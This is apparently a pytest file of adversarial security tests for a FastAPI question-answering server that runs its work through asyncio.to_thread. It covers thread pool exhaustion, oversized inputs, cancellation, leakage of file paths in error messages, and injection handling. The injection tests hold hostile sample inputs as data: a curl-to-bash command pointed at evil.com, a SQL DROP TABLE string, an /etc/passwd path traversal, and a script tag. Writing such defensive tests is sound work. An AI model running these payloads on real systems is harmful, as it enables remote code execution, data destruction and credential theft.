"""
Adversarial security tests for asyncio.to_thread() wrapping in api_server.py

Tests attack vectors against the asyncio.to_thread() wrapped endpoints:
- Thread pool exhaustion via concurrent requests
- Oversized payloads (large question text, many directories)
- Cancellation/timeout attacks against thread pool
- Exception leakage through asyncio.to_thread error paths

Phase 1.1: API & Thread Safety - asyncio.to_thread() adversarial testing
"""

import pytest
import asyncio
import time
import threading
import traceback
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from httpx import AsyncClient, ASGITransport

from api_server import (
    app,
    QuestionRequest,
    SearchRequest,
    IngestRequest,
)


pytestmark = pytest.mark.unit


# =============================================================================
# 1. THREAD POOL EXHAUSTION ATTACKS
# =============================================================================

class TestThreadPoolExhaustion:
    """Test thread pool exhaustion attacks against asyncio.to_thread endpoints."""

    @pytest.mark.asyncio
    async def test_concurrent_asks_exhaust_thread_pool(self):
        """Send many concurrent /ask requests to check for thread pool deadlock.

        If asyncio.to_thread() is NOT used, this would block the event loop.
        With proper wrapping, requests should either queue or fail gracefully
        when thread pool is exhausted.
        """
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            # Very slow synchronous function to occupy thread pool
            def very_slow_query(*args, **kwargs):
                time.sleep(5)  # Long blocking call
                return MagicMock(
                    question="What is Python?",
                    answer="Python is a programming language.",
                    sources=["doc1.txt"],
                    context_length=100,
                    inference_time=5.0,
                )

            mock_engine.query = very_slow_query

            # Create many concurrent requests (exceeds default thread pool size ~40)
            num_requests = 50
            ask_request = QuestionRequest(question="What is Python?", n_results=3)

            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=30) as ac:
                # Fire all requests concurrently
                tasks = [ac.post("/ask", json=ask_request.model_dump()) for _ in range(num_requests)]

                # Wait for first batch to start
                await asyncio.sleep(0.5)

                # Health check should STILL be responsive even under thread pool pressure
                health_task = asyncio.create_task(ac.get("/"))
                health_response = await asyncio.wait_for(health_task, timeout=3.0)

                # The critical assertion: event loop must remain responsive
                assert health_response.status_code == 200, "Event loop blocked by thread pool exhaustion"

    @pytest.mark.asyncio
    async def test_rapid_fire_requests_no_hang(self):
        """Rapid fire requests should not hang the server.

        Tests that the server can handle a burst of requests without
        hanging or deadlocking the event loop.
        """
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="test answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.01,
            )

            ask_request = QuestionRequest(question="Test", n_results=3)

            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=10) as ac:
                # Fire 20 rapid requests
                tasks = [ac.post("/ask", json=ask_request.model_dump()) for _ in range(20)]
                responses = await asyncio.gather(*tasks, return_exceptions=True)

                # All should succeed or fail gracefully - no hangs
                for resp in responses:
                    assert not isinstance(resp, asyncio.TimeoutError), "Request timed out - possible hang"
                    if isinstance(resp, Exception):
                        # Exceptions are acceptable (500, etc) but not timeouts
                        assert not isinstance(resp, asyncio.TimeoutError)

    @pytest.mark.asyncio
    async def test_search_and_ask_parallel_no_deadlock(self):
        """Parallel /search and /ask should not deadlock.

        Both endpoints use asyncio.to_thread() - they should be able to
        run concurrently without deadlock.
        """
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            def slow_query(*args, **kwargs):
                time.sleep(0.5)
                return MagicMock(
                    question="What is Python?",
                    answer="Python is a programming language.",
                    sources=["doc1.txt"],
                    context_length=100,
                    inference_time=0.5,
                )

            def slow_search(*args, **kwargs):
                time.sleep(0.5)
                return [("Document text", {"source": "doc1.txt"}, 0.85)]

            mock_engine.query = slow_query
            mock_engine.search_documents = slow_search

            ask_request = QuestionRequest(question="What is Python?", n_results=3)
            search_request = SearchRequest(query="test query", n_results=5)

            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=5) as ac:
                # Create parallel tasks
                ask_task = asyncio.create_task(ac.post("/ask", json=ask_request.model_dump()))
                search_task = asyncio.create_task(ac.post("/search", json=search_request.model_dump()))

                # Both should complete without deadlock
                ask_resp, search_resp = await asyncio.gather(ask_task, search_task, return_exceptions=True)

                assert not isinstance(ask_resp, Exception), f"Ask failed: {ask_resp}"
                assert not isinstance(search_resp, Exception), f"Search failed: {search_resp}"


# =============================================================================
# 2. OVERSIZED PAYLOAD ATTACKS
# =============================================================================

class TestOversizedPayloads:
    """Test oversized payload attacks against asyncio.to_thread endpoints."""

    def test_extremely_long_question_text(self):
        """Send extremely long question text (near max + beyond).

        Pydantic max_length=2000 should reject anything larger.
        Verify the validation happens BEFORE reaching asyncio.to_thread.
        """
        # 10KB of repeated text - well beyond the 2000 char limit
        oversized_question = "A" * 10000

        client = TestClient(app)

        # Should fail validation BEFORE reaching asyncio.to_thread
        # Send raw JSON directly to test validation at the FastAPI layer
        response = client.post("/ask", json={"question": oversized_question, "n_results": 3})

        # Validation should reject this
        assert response.status_code == 422, "Oversized payload not rejected"

    def test_max_length_boundary_question(self):
        """Send question at exactly the max_length boundary (2000 chars)."""
        # Exactly 2000 characters
        boundary_question = "Q" * 2000

        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question=boundary_question[:100],
                answer="Answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            request = QuestionRequest(question=boundary_question, n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            # Should pass validation
            assert response.status_code == 200

    def test_empty_question_rejected(self):
        """Empty question should be rejected by validation before asyncio.to_thread."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            # Empty string
            client = TestClient(app)
            response = client.post("/ask", json={"question": "", "n_results": 3})

            assert response.status_code == 422

    def test_whitespace_only_question_rejected(self):
        """Whitespace-only question should be rejected by validator before asyncio.to_thread."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            # Whitespace only
            client = TestClient(app)
            response = client.post("/ask", json={"question": "   \n\t  ", "n_results": 3})

            assert response.status_code == 422

    def test_unicode_overflow_question(self):
        """Unicode characters that expand dramatically when processed.

        A short-looking string with complex unicode that could expand
        significantly during normalization/processing.
        """
        # Complex unicode that normalizes to very long text
        # Combining characters, variation selectors, etc.
        complex_unicode = "\u0300\u0301\u0302" * 1000  # Combining diacritics

        client = TestClient(app)
        response = client.post("/ask", json={"question": complex_unicode, "n_results": 3})

        # Should either pass validation (if under 2000 chars) or fail gracefully
        # The key is it shouldn't crash or hang
        assert response.status_code in [200, 422]

    def test_null_bytes_in_question(self):
        """Null bytes in question should be rejected or sanitized."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="test answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            # Question with null byte - send raw JSON
            client = TestClient(app)
            response = client.post("/ask", json={"question": "test\x00injection", "n_results": 3})
            # Validation or server should handle this
            assert response.status_code in [200, 422]

    def test_max_search_query_boundary(self):
        """Search query at max_length boundary (500 chars)."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.search_documents.return_value = [
                ("Document text", {"source": "doc1.txt"}, 0.85),
            ]

            # Exactly 500 characters
            boundary_query = "S" * 500
            request = SearchRequest(query=boundary_query, n_results=5)
            client = TestClient(app)
            response = client.post("/search", json=request.model_dump())

            assert response.status_code == 200

    def test_oversized_search_query_rejected(self):
        """Search query exceeding max_length (500) should be rejected."""
        oversized_query = "X" * 1000

        client = TestClient(app)
        response = client.post("/search", json={"query": oversized_query, "n_results": 5})

        assert response.status_code == 422


# =============================================================================
# 3. CANCELLATION / TIMEOUT ATTACKS
# =============================================================================

class TestCancellationTimeoutAttacks:
    """Test cancellation and timeout attacks against asyncio.to_thread."""

    @pytest.mark.asyncio
    async def test_request_cancellation_during_query(self):
        """Test that client disconnection during query is handled gracefully.

        When a client disconnects mid-request, the thread pool work should
        complete (or be cancelled) without crashing the server.
        """
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            # Slow query that might be cancelled
            def slow_query(*args, **kwargs):
                time.sleep(2)
                return MagicMock(
                    question="What is Python?",
                    answer="Python is a programming language.",
                    sources=["doc1.txt"],
                    context_length=100,
                    inference_time=2.0,
                )

            mock_engine.query = slow_query

            ask_request = QuestionRequest(question="What is Python?", n_results=3)

            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=0.5) as ac:
                # This should timeout, not crash the server
                try:
                    response = await ac.post("/ask", json=ask_request.model_dump())
                    # Timeout is acceptable
                    assert response.status_code in [200, 408, 499, 500]
                except Exception as e:
                    # Any exception should not crash the server
                    # Server should remain responsive
                    assert not isinstance(e, (asyncio.CancelledError, KeyboardInterrupt))

            # Server should still be responsive after timeout
            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=5) as ac:
                health = await ac.get("/")
                assert health.status_code == 200

    @pytest.mark.asyncio
    async def test_multiple_rapid_cancellations_no_crash(self):
        """Multiple rapid client disconnections should not crash server."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            def very_slow_query(*args, **kwargs):
                time.sleep(10)
                return MagicMock(
                    question="test",
                    answer="test",
                    sources=[],
                    context_length=0,
                    inference_time=10.0,
                )

            mock_engine.query = very_slow_query

            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=0.1) as ac:
                ask_request = QuestionRequest(question="test", n_results=3)

                # Fire several requests that will all timeout
                for _ in range(5):
                    try:
                        await ac.post("/ask", json=ask_request.model_dump())
                    except Exception:
                        pass

                    await asyncio.sleep(0.05)

            # Server should still be healthy
            async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test", timeout=5) as ac:
                health = await ac.get("/")
                assert health.status_code == 200


# =============================================================================
# 4. EXCEPTION LEAKAGE THROUGH asyncio.to_thread ERROR PATHS
# =============================================================================

class TestExceptionLeakage:
    """Test that internal exceptions don't leak sensitive information through asyncio.to_thread."""

    def test_database_error_no_stack_trace_leak(self):
        """Database errors should not expose internal paths through asyncio.to_thread."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            # Simulate a database error with internal paths
            mock_engine.query.side_effect = RuntimeError(
                "Database connection failed at /opt/app/data/db.sqlite:42"
            )

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            # Should NOT contain internal paths or stack traces
            assert "/opt/app/" not in response_text, "Internal path leaked in response"
            assert "data/db.sqlite" not in response_text, "Database path leaked"
            assert "at line" not in response_text.lower() or "42" not in response_text

    def test_file_not_found_error_no_path_leak(self):
        """FileNotFoundError should not expose system paths."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            # Simulate file not found with internal path
            mock_engine.query.side_effect = FileNotFoundError(
                "Model file not found: /home/user/.cache/model.gguf"
            )

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            # Should NOT contain home directory or cache paths
            assert "/home/user/" not in response_text, "Home path leaked"
            assert ".cache/" not in response_text, "Cache path leaked"

    def test_permission_error_no_sensitive_paths(self):
        """Permission errors should not expose sensitive file system info."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            # Simulate permission error with sensitive path
            mock_engine.query.side_effect = PermissionError(
                "Access denied to /etc/secrets/api_key.txt"
            )

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            # Should NOT contain /etc/secrets
            assert "/etc/secrets/" not in response_text, "Secrets path leaked"

    def test_memory_error_no_heap_dump(self):
        """MemoryError should not leak heap/stack information."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.side_effect = MemoryError(
                "Failed to allocate 16GB for embeddings at 0x7f8a2b3c4d5e"
            )

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            # Should NOT contain memory addresses
            assert "0x7f" not in response_text, "Memory address leaked"

    def test_generic_exception_still_safe(self):
        """Generic exceptions should still not leak sensitive info."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            # Bare exception with internal info
            mock_engine.query.side_effect = Exception(
                "Critical failure in module /app/src/rag_engine.py:500"
            )

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            # Should NOT contain internal paths
            assert "/app/src/" not in response_text, "Internal app path leaked"

    def test_search_error_no_stack_trace_leak(self):
        """Search endpoint errors should not leak stack traces."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.search_documents.side_effect = RuntimeError(
                "Index corrupted at /data/chroma/index.bin:0xDEADBEEF"
            )

            request = SearchRequest(query="test query", n_results=5)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/search", json=request.model_dump())

            assert response.status_code == 500
            response_text = str(response.json())

            assert "/data/chroma/" not in response_text
            assert "0xDEADBEEF" not in response_text

    def test_ingest_error_no_path_leak(self):
        """Ingest endpoint errors should not leak file system paths."""
        with patch('api_server.engine') as mock_engine:
            with patch('api_server.validate_directory') as mock_validate:
                mock_validate.return_value = "/var/data/documents"
                mock_engine.ingest_directory.side_effect = OSError(
                    "Cannot read directory /var/data/documents at permission level 0x755"
                )

                request = IngestRequest(directory="/var/data/documents")
                client = TestClient(app, raise_server_exceptions=False)
                response = client.post("/ingest", json=request.model_dump())

                assert response.status_code == 500
                response_text = str(response.json())

                assert "/var/data/" not in response_text
                assert "0x755" not in response_text

    def test_correlation_id_returned_on_error(self):
        """Errors should return a correlation ID for support, not sensitive data."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.side_effect = RuntimeError("Internal error")

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app, raise_server_exceptions=False)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 500
            data = response.json()

            # Should have correlation_id for support
            assert "correlation_id" in data or "detail" in data

            # But detail should be user-friendly, not a stack trace
            assert "traceback" not in str(data).lower()
            assert "RuntimeError" not in str(data)


# =============================================================================
# 5. BOUNDARY VIOLATIONS
# =============================================================================

class TestBoundaryViolations:
    """Test boundary violations against asyncio.to_thread endpoints."""

    def test_negative_n_results_rejected(self):
        """Negative n_results should be rejected by validation."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            client = TestClient(app)
            response = client.post("/ask", json={"question": "Test question?", "n_results": -1})

            assert response.status_code == 422

    def test_zero_n_results_rejected(self):
        """Zero n_results should be rejected by validation."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            client = TestClient(app)
            response = client.post("/ask", json={"question": "Test question?", "n_results": 0})

            assert response.status_code == 422

    def test_way_oversized_n_results_rejected(self):
        """n_results way beyond limit should be rejected."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()

            client = TestClient(app)
            response = client.post("/ask", json={"question": "Test question?", "n_results": 999999})

            assert response.status_code == 422

    def test_engine_uninitialized_returns_503_before_thread(self):
        """Uninitialized engine should return 503 before reaching asyncio.to_thread."""
        with patch('api_server.engine', None):
            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 503
            # Should not even attempt to use asyncio.to_thread
            assert "not initialized" in response.json()["detail"].lower()

    def test_llm_unavailable_returns_503_before_thread(self):
        """No LLM backend should return 503 before reaching asyncio.to_thread."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = None  # LLM not available

            request = QuestionRequest(question="What is Python?", n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code == 503
            assert "llm" in response.json()["detail"].lower()


# =============================================================================
# 6. INJECTION ATTEMPTS THROUGH asyncio.to_thread PAYLOADS
# =============================================================================

class TestInjectionThroughPayloads:
    """Test injection attacks passed through asyncio.to_thread to backend systems."""

    def test_sql_injection_in_question(self):
        """SQL injection attempts in question should not reach backend."""
        # This tests that the API properly validates inputs before
        # passing to asyncio.to_thread wrapped functions
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="Answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            # SQL injection attempt
            injection = "'; DROP TABLE documents; --"
            request = QuestionRequest(question=injection, n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            # Should either validate/reject or pass to backend that handles it safely
            assert response.status_code in [200, 422]

    def test_path_traversal_in_question(self):
        """Path traversal attempts in question should be handled safely."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="Answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            # Path traversal attempt
            traversal = "../../../etc/passwd"
            request = QuestionRequest(question=traversal, n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            # Should be handled safely
            assert response.status_code in [200, 422]

    def test_shell_injection_in_question(self):
        """Shell injection attempts should be handled safely."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="Answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            # Shell injection
            injection = "$(curl http://evil.com/shell.sh | bash)"
            request = QuestionRequest(question=injection, n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code in [200, 422]

    def test_html_script_injection(self):
        """HTML/script injection should be handled safely."""
        with patch('api_server.engine') as mock_engine:
            mock_engine.llm = MagicMock()
            mock_engine.query.return_value = MagicMock(
                question="test",
                answer="Answer",
                sources=["doc1.txt"],
                context_length=100,
                inference_time=0.1,
            )

            # XSS attempt
            injection = "<script>alert('XSS')</script>"
            request = QuestionRequest(question=injection, n_results=3)
            client = TestClient(app)
            response = client.post("/ask", json=request.model_dump())

            assert response.status_code in [200, 422]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
